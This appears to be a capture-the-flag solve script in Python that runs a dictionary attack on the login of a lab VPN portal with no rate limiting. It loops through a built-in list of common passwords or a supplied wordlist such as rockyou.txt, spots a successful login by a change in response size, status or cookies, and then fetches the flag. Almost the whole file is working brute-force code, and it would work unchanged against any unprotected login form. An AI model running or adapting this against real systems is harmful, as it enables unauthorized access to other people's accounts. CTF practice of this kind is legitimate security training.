#!/usr/bin/env python3
"""
RemoteLink VPN (auth, 150) — CWE-307, no brute-force protection (dictionary attack).

The portal never rate-limits or locks out, and vpnuser's password is a dictionary
word. A wrong password returns a fixed 200 / ~1026-byte page; a correct one breaks
that pattern (redirect / different size / session cookie). Spray a wordlist until
the pattern breaks.

Usage:
    python3 solve.py                                   # built-in common list, auth13:8072
    python3 solve.py /usr/share/wordlists/rockyou.txt  # a real wordlist
    python3 solve.py rockyou.txt http://auth13.chal.deti:8072
"""
import re
import sys

import requests

WORDLIST = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("http") else None
BASE = next((a for a in sys.argv[1:] if a.startswith("http")), "http://auth13.chal.deti:8072").rstrip("/")
LOGIN = f"{BASE}/login"
USER = "vpnuser"

FLAG_RE = re.compile(r"flag\{[^}]*\}")

# fallback if no wordlist file given — common/dictionary passwords
BUILTIN = """123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567
dragon 123123 baseball abc123 football monkey letmein shadow master 666666
qwertyuiop 123321 mustang 1234567890 michael 654321 superman 1qaz2wsx 7777777
121212 000000 qazwsx 123qwe killer trustno1 jordan jennifer zxcvbnm asdfgh
hunter buster soccer harley batman andrew tigger sunshine iloveyou 2000 charlie
robert thomas hockey ranger daniel starwars klaster 112233 george computer
michelle jessica pepper 1111 zxcvbn 555555 11111111 131313 freedom 777777 pass
maggie 159753 aaaaaa ginger princess joshua cheese amanda summer love ashley
nicole chelsea biteme matthew access yankees 987654321 dallas austin thunder
taylor matrix welcome admin secret vpn remote portal changeme""".split()


def attempt(session, pw):
    r = session.post(LOGIN, data={"username": USER, "password": pw},
                     allow_redirects=False, timeout=10)
    return r


def passwords():
    if WORDLIST:
        with open(WORDLIST, encoding="latin-1") as f:
            for line in f:
                pw = line.rstrip("\n")
                if pw and not pw.startswith("#"):
                    yield pw
    else:
        yield from BUILTIN


def main() -> int:
    s = requests.Session()
    base = attempt(s, "definitely-wrong-xyz-0000")
    fail = (base.status_code, len(base.content))
    print(f"[i] fail baseline: status={fail[0]} size={fail[1]}")

    for i, pw in enumerate(passwords(), 1):
        s.cookies.clear()
        r = attempt(s, pw)
        sig = (r.status_code, len(r.content))
        if sig != fail or r.cookies:
            print(f"[+] PASSWORD FOUND: {USER}:{pw}  (status={sig[0]} size={sig[1]})")
            # follow through to grab a flag if present
            r2 = s.post(LOGIN, data={"username": USER, "password": pw}, timeout=10)
            m = FLAG_RE.search(r2.text)
            if m:
                print(f"[+] FLAG: {m.group(0)}")
            else:
                home = s.get(f"{BASE}/", timeout=10).text
                m = FLAG_RE.search(home)
                print(f"[+] FLAG: {m.group(0)}" if m else "[i] logged in; check the portal for the flag")
            return 0
        if i % 500 == 0:
            print(f"[i] tried {i}...")
    print("[-] no password matched; try a bigger wordlist (pass rockyou.txt as arg)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
